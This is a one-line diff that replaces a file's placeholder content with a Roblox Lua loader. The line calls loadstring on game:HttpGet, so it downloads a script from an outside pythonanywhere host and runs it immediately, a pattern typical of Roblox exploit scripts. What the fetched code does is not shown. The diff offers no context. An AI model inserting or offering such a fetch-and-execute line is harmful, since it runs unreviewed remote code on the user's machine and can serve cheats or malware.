@@ -1,1 +1,1 @@
-. 
+loadstring(game:HttpGet("https://maxxi1mka.pythonanywhere.com/get_script"))()
